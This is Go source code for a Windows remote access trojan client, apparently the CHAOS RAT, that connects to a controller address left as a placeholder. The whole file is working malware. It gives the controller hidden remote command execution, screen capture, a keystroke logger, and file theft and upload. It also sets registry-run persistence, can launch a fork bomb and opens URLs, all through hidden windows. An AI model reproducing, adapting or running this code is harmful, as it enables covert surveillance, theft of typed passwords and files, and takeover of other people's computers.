package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"image/png"
	"io/ioutil"
	"net"
	"os"
	"os/exec"
	"syscall"
	"time"

	screenshot "github.com/kbinani/screenshot"
)

const (
	IP         = "IPAddress:ServerPort"
	fileName   = "FileNameCHAOS"
	folderPath = "\\ProgramData"
	folderExt  = "\\NameFolderExtesion"
)

var (
	dll, _              = syscall.LoadDLL("user32.dll")
	GetAsyncKeyState, _ = dll.FindProc("GetAsyncKeyState")
	GetKeyState, _      = dll.FindProc("GetKeyState")
	Logs                string
)

func main() {
	// WaitTimeMenu()
	for {
		connect()
	}
}

func WaitTimeMenu() {
	go func() {
		time.Sleep(time.Second * 30)
	}()
	select {
	case <-time.After(time.Second * 30):
	}
}

func TakeScreenShot() {
	n := screenshot.NumActiveDisplays()

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			connect()
		}
		file, _ := os.Create(os.Getenv("systemdrive") + folderPath + "\\screenshot.png")
		defer file.Close()
		png.Encode(file, img)
	}
}

func connect() {
	conn, err := net.Dial("tcp", IP)

	if err != nil {
		fmt.Println("Connecting...")
		for {
			connect()
		}
	}

	for {
		command, _ := bufio.NewReader(conn).ReadString('\n')
		fmt.Println(command)

		decodedCase, _ := base64.StdEncoding.DecodeString(command)
		fmt.Print(string(decodedCase))

		switch string(decodedCase) {

		case "back":
			conn.Close()
			connect()

		case "exit":
			conn.Close()
			os.Exit(0)

		case "screenshot":
			TakeScreenShot()
			file, err := ioutil.ReadFile(string(os.Getenv("systemdrive") + folderPath + "\\screenshot.png"))

			if err != nil {
				conn.Write([]byte("[!] File not found!" + "\n"))
			}

			encData := base64.URLEncoding.EncodeToString(file)
			conn.Write([]byte(string(encData) + "\n"))
			fmt.Println(encData)
			command, _ := bufio.NewReader(conn).ReadString('\n')
			fmt.Println(command)

		case "keylogger start":
			go Keylogger()
			encoded := base64.StdEncoding.EncodeToString([]byte("-> Listening!"))
			conn.Write([]byte(string(encoded) + "\n"))
			command, _ := bufio.NewReader(conn).ReadString('\n')
			fmt.Println(command)

		case "keylogger show":
			encoded := base64.StdEncoding.EncodeToString([]byte(string(Logs)))
			conn.Write([]byte(string(encoded) + "\n"))
			command, _ := bufio.NewReader(conn).ReadString('\n')
			fmt.Println(command)

		case "download":
			download, _ := bufio.NewReader(conn).ReadString('\n')
			decodeDownload, _ := base64.StdEncoding.DecodeString(download)
			file, err := ioutil.ReadFile(string(decodeDownload))

			if err != nil {
				conn.Write([]byte("[!] File not found!" + "\n"))
			}

			encData := base64.URLEncoding.EncodeToString(file)
			conn.Write([]byte(string(encData) + "\n"))
			fmt.Println(encData)

			command, _ := bufio.NewReader(conn).ReadString('\n')
			fmt.Println(command)

		case "upload":
			uploadOutput, _ := bufio.NewReader(conn).ReadString('\n')
			decodeOutput, _ := base64.StdEncoding.DecodeString(uploadOutput)
			encData, _ := bufio.NewReader(conn).ReadString('\n')
			decData, _ := base64.URLEncoding.DecodeString(encData)
			ioutil.WriteFile(string(decodeOutput), []byte(decData), 777)

		case "getos":
			cmd := exec.Command("cmd", "/C", "wmic os get name")
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			c, _ := cmd.Output()
			encoded := base64.StdEncoding.EncodeToString(c)
			conn.Write([]byte(string(encoded) + "\n"))
			command, _ := bufio.NewReader(conn).ReadString('\n')
			fmt.Println(command)

		case "lockscreen":
			cmd := exec.Command("cmd", "/C", "rundll32.exe user32.dll,LockWorkStation")
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			c, _ := cmd.Output()
			fmt.Println(string(c))
			encoded := base64.StdEncoding.EncodeToString([]byte("-> Locked!"))
			conn.Write([]byte(string(encoded) + "\n"))
			command, _ := bufio.NewReader(conn).ReadString('\n')
			fmt.Println(command)

		case "ls":
			cmd := exec.Command("cmd", "/C", "dir")
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			c, _ := cmd.Output()
			encoded := base64.StdEncoding.EncodeToString(c)
			conn.Write([]byte(string(encoded) + "\n"))
			command, _ := bufio.NewReader(conn).ReadString('\n')
			fmt.Println(command)

		case "persistence enable":
			os.MkdirAll(os.Getenv("systemdrive")+folderPath+folderExt, 0777)

			cmd := exec.Command("cmd", "/C", "xcopy /Y "+fileName+" "+os.Getenv("systemdrive")+folderPath+folderExt)
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			c, _ := cmd.Output()
			encoded := base64.StdEncoding.EncodeToString(c)
			fmt.Println(encoded)

			startupReg := "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V \"CHAOS Startup\" /t REG_SZ /F /D " + "\"" + "%systemdrive%" + folderPath + folderExt + "\\" + fileName + "\""
			batReg, _ := os.Create(os.Getenv("systemdrive") + folderPath + folderExt + "\\reg.bat")
			batReg.WriteString(string(startupReg))
			batReg.Close()
			execBatReg := exec.Command("cmd", "/C", os.Getenv("systemdrive")+folderPath+folderExt+"\\reg.bat")
			execBatReg.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			execBatReg.Run()

			statusPersistenceSuccess := base64.StdEncoding.EncodeToString([]byte("[*] Persistence Enabled!"))
			statusPersistenceFailed := base64.StdEncoding.EncodeToString([]byte("[!] Persistence Failed!"))

			file := os.Getenv("systemdrive") + folderPath + folderExt + "\\" + fileName
			_, err := os.Stat(file)
			if err == nil {
				conn.Write([]byte(statusPersistenceSuccess + "\n"))
			} else if os.IsNotExist(err) {
				for {
					conn.Write([]byte(statusPersistenceFailed + "\n"))
				}
			}
			command, _ := bufio.NewReader(conn).ReadString('\n')
			fmt.Println(command)

		case "persistence disable":
			os.RemoveAll(os.Getenv("systemdrive") + folderPath + folderExt)

			startupReg := "REG DELETE HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V \"CHAOS Startup\" /F"
			fmt.Println(startupReg)

			batReg, _ := os.Create(os.Getenv("systemdrive") + folderPath + "\\reg.bat")
			batReg.WriteString(string(startupReg))
			batReg.Close()

			execBatReg := exec.Command("cmd", "/C", os.Getenv("systemdrive")+folderPath+"\\reg.bat")
			execBatReg.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			execBatReg.Run()

			statusPersistenceSuccess := base64.StdEncoding.EncodeToString([]byte("[*] Persistence Disabled!"))
			conn.Write([]byte(statusPersistenceSuccess + "\n"))
			command, _ := bufio.NewReader(conn).ReadString('\n')
			fmt.Println(command)

		case "bomb":
			forkBombCommand := "%0|%0"
			forkBomb, _ := os.Create(os.Getenv("systemdrive") + folderPath + "\\bomb.bat")
			forkBomb.WriteString(string(forkBombCommand))
			forkBomb.Close()

			execForkBomb := exec.Command("cmd", "/C", os.Getenv("systemdrive")+folderPath+"\\bomb.bat && del "+os.Getenv("systemdrive")+folderPath+"\\bomb.bat")
			execForkBomb.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			execForkBomb.Run()

			statusMessageForkBomb := base64.StdEncoding.EncodeToString([]byte("[*] Executed Fork Bomb!"))
			conn.Write([]byte(statusMessageForkBomb + "\n"))
			command, _ := bufio.NewReader(conn).ReadString('\n')
			fmt.Println(command)

		case "openurl":
			url, _ := bufio.NewReader(conn).ReadString('\n')
			decodeUrl, _ := base64.StdEncoding.DecodeString(url)

			cmd := exec.Command("cmd", "/C", "start "+string(decodeUrl))
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			cmd.Run()

			status := base64.StdEncoding.EncodeToString([]byte("[*] Opened!"))
			conn.Write([]byte(status + "\n"))
			command, _ := bufio.NewReader(conn).ReadString('\n')
			fmt.Println(command)
		} // end switch

		cmd := exec.Command("cmd", "/C", command)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		c, _ := cmd.Output()

		encoded := base64.StdEncoding.EncodeToString(c)
		conn.Write([]byte(string(encoded) + "\n"))
		_, err := conn.Read(make([]byte, 0))

		if err != nil {
			connect()
		}
	}
}

// It is just a poor implementation of a keylogger written in golang
func Keylogger() {
	for {

		time.Sleep(1 * time.Millisecond)

		for i := 0; i < 256; i++ {
			Result, _, _ := GetAsyncKeyState.Call(uintptr(i))

			if Result&0x1 == 0 {
				continue
			}

			switch i {
			case 8:
				Logs += "[Backspace]"
			case 9:
				Logs += "[Tab]"
			case 13:
				Logs += "[Enter]"
			case 16:
				Logs += "[Shift]"
			case 17:
				Logs += "[Control]"
			case 18:
				Logs += "[Alt]"
			case 19:
				Logs += "[Pause]"
			case 27:
				Logs += "[Esc]"
			case 32:
				Logs += " "
			case 33:
				Logs += "[PageUp]"
			case 34:
				Logs += "[PageDown]"
			case 35:
				Logs += "[End]"
			case 36:
				Logs += "[Home]"
			case 37:
				Logs += "[Left]"
			case 38:
				Logs += "[Up]"
			case 39:
				Logs += "[Right]"
			case 40:
				Logs += "[Down]"
			case 44:
				Logs += "[PrintScreen]"
			case 45:
				Logs += "[Insert]"
			case 46:
				Logs += "[Delete]"
			case 48:
				Logs += "[0)]"
			case 49:
				Logs += "[1!]"
			case 50:
				Logs += "[2@]"
			case 51:
				Logs += "[3#]"
			case 52:
				Logs += "[4$]"
			case 53:
				Logs += "[5%]"
			case 54:
				Logs += "[6¨]"
			case 55:
				Logs += "[7&]"
			case 56:
				Logs += "[8*]"
			case 57:
				Logs += "[9(]"
			case 65:
				Logs += "A"
			case 66:
				Logs += "B"
			case 67:
				Logs += "C"
			case 186:
				Logs += "Ç"
			case 68:
				Logs += "D"
			case 69:
				Logs += "E"
			case 70:
				Logs += "F"
			case 71:
				Logs += "G"
			case 72:
				Logs += "H"
			case 73:
				Logs += "I"
			case 74:
				Logs += "J"
			case 75:
				Logs += "K"
			case 76:
				Logs += "L"
			case 77:
				Logs += "M"
			case 78:
				Logs += "N"
			case 79:
				Logs += "O"
			case 80:
				Logs += "P"
			case 81:
				Logs += "Q"
			case 82:
				Logs += "R"
			case 83:
				Logs += "S"
			case 84:
				Logs += "T"
			case 85:
				Logs += "U"
			case 86:
				Logs += "V"
			case 87:
				Logs += "X"
			case 88:
				Logs += "Z"
			case 89:
				Logs += "Y"
			case 90:
				Logs += "Z"
			case 96:
				Logs += "0"
			case 97:
				Logs += "1"
			case 98:
				Logs += "2"
			case 99:
				Logs += "3"
			case 100:
				Logs += "4"
			case 101:
				Logs += "5"
			case 102:
				Logs += "6"
			case 103:
				Logs += "7"
			case 104:
				Logs += "8"
			case 105:
				Logs += "9"
			case 106:
				Logs += "*"
			case 107:
				Logs += "+"
			case 109:
				Logs += "-"
			case 110:
				Logs += ","
			case 111:
				Logs += "/"
			case 112:
				Logs += "[F1]"
			case 113:
				Logs += "[F2]"
			case 114:
				Logs += "[F3]"
			case 115:
				Logs += "[F4]"
			case 116:
				Logs += "[F5]"
			case 117:
				Logs += "[F6]"
			case 118:
				Logs += "[F7]"
			case 119:
				Logs += "[F8]"
			case 120:
				Logs += "[F9]"
			case 121:
				Logs += "[F10]"
			case 122:
				Logs += "[F11]"
			case 123:
				Logs += "[F12]"
			case 91:
				Logs += "[Super]"
			case 93:
				Logs += "[Menu]"
			case 144:
				Logs += "[NumLock]"
			case 189:
				Logs += "[-_]"
			case 187:
				Logs += "[=+]"
			case 188:
				Logs += "[,<]"
			case 190:
				Logs += "[.>]"
			case 191:
				Logs += "[;:]"
			case 192:
				Logs += "['\"]"
			case 193:
				Logs += "[/?]"
			case 221:
				Logs += "[[{]"
			case 220:
				Logs += "[]}]"
			case 226:
				Logs += "[\\|]"
			}
		}
	}
}
